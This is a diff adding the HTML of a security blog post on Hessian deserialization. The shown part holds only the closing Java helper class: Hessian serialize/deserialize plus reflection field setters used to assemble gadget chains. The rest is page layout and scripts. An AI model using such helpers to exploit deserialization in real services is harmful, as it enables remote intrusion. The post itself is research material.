+        output.write<span class="hljs-constructor">Object(<span class="hljs-params">o</span>)</span>;
+        output.close<span class="hljs-literal">()</span>;
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(bao.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);
+        return bao.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>;
+    &#125;
+    public static &lt;T&gt; T deserialize(byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span>)throws IOException&#123;
+        ByteArrayInputStream stream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">bytes</span>)</span>;
+        HessianInput input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HessianInput(<span class="hljs-params">stream</span>)</span>;
+        Object o = input.read<span class="hljs-constructor">Object()</span>;
+        return (T) o;
+    &#125;
+    public static void set<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>,String <span class="hljs-params">name</span>,Object <span class="hljs-params">value</span>)</span> throws Exception &#123;
+        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        field.set(obj, value);
+    &#125;
+    public static Object get<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>,String <span class="hljs-params">name</span>)</span> throws Exception &#123;
+        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        return field.get(obj);
+    &#125;
+&#125;</code></pre></div>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hessian反序列化</div>
+      <div>https://zer0peach.github.io/2024/03/03/Hessian反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/02/spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="spring内存马">
+                        <span class="hidden-mobile">spring内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
